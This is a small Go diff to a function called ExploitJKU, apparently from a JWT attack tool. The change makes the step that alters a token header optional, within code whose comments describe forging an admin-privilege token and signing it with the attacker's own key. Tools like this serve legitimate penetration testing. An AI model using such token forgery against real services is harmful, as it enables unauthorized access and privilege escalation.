@@ -35,10 +35,12 @@ func ExploitJKU(token *jwt.Token, userHeader string, userValue string) string {
 	}
 
 	//Change the value of the header to create the admin privs token
-	newToken, err = ctrl.ChangeValue(newToken, userHeader, userValue, false)
-	if err != nil {
-		fmt.Printf("An error ocurred while modifying the value of the \"%s\" header : %v \n", userHeader, err)
-		return ""
+	if userHeader != "" {
+		newToken, err = ctrl.ChangeValue(newToken, userHeader, userValue, false)
+		if err != nil {
+			fmt.Printf("An error ocurred while modifying the value of the \"%s\" header : %v \n", userHeader, err)
+			return ""
+		}
 	}
 
 	//Sign the token with our private key
